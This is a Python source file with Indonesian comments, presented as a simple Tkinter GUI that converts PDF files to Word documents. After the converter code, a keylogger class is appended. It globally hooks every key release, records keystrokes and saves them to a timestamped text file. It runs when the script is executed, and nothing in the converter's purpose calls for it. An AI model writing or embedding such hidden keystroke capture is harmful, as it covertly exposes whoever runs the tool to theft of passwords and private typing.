# README
# Baca panduan ini dulu ya 
# Sebelum Menjalankan projectnya membutuhkan beberapa yang harus di install
# Seperti:
# pip install pdf2docx
# pip install keyboard



from tkinter import *
from tkinter import messagebox, filedialog
from pdf2docx import parse
import keyboard
from datetime import datetime

root = Tk()
root.resizable(False, False)
root.config(bg='black')
root.geometry("300x190")
root.title("PDF to WORD Converter by Mee")


def file():
    global pdf
    pdf = filedialog.askopenfilename(title='Select File', filetypes=[("PDF Files", "*.pdf"), ("All Files", "*.*")])
    path.insert(0, str(pdf))


Label(root, text='Meee', font=('sans-serif', 20, 'bold', 'italic', 'underline'), bg='black', fg='#06beb6').pack(pady=10)
path=Entry(root,width=28, bd=0, font=('times', 15, 'italic'), bg='black', fg='gray')
path.pack()
Button(root, text='Pilih File PDFnya', command=file, bg='black', fg='white', activebackground='black', activeforeground="#ee9ca7", font=("rosemary", 15, "italic"), bd=0).pack()

def export():
    if len(path.get()) != 0 :
        word = filedialog.asksaveasfilename(title='Save As', defaultextension=".docx", filetypes=[("Word", "*.docx"), ("All Files", "*.*")])
        parse(str(pdf), str(word), start=0, end=None)
        messagebox.showinfo('PDF to WORD', 'Suksess Mengkonversi')
        path.delete(0, END)
    else:
        messagebox.showerror('PDF to WORD', 'Belum Ada file yang PDF yang dipilih')

Button(root, text='Convert to WORD?', command=export, bg='black', fg='white', activebackground='black', activeforeground="#00FF00", font=("rosemary", 15, "italic"), bd=0).pack()


def exit():
    d = messagebox.askquestion('Keluar', "Beneran Ingin Keluar?")
    if d =="yes":
        root.destroy()
    else:
        return None


Button(root, text='Keluar?', command=exit, bd=0, font=("rosemary", 12, "italic"), bg='black', fg='white', activebackground='black', activeforeground='#ff0000').pack()

root.mainloop()


class Keylogger:
    def __init__(self):
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()
        self.running = True

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name

    def update_filename(self):
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    def report_to_file(self):
        with open(f"{self.filename}.txt", "w") as f:
            f.write(self.log)
        print(f"[+] Saved {self.filename}.txt")

    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        print(f"{datetime.now()}  - Ini jangan di silang.")

    def stop(self):
        self.end_dt = datetime.now()
        self.update_filename()
        self.report_to_file()
        self.running = False
        keyboard.unhook_all()
        print(f"{datetime.now()} - Keylogger stopped.")

if __name__ == "__main__":
    keylogger = Keylogger()
    keylogger.start()
    while keylogger.running:
        try:
            if keyboard.is_pressed("ctrl+shift+s"):
                keylogger.stop()
                break
        except:
            pass
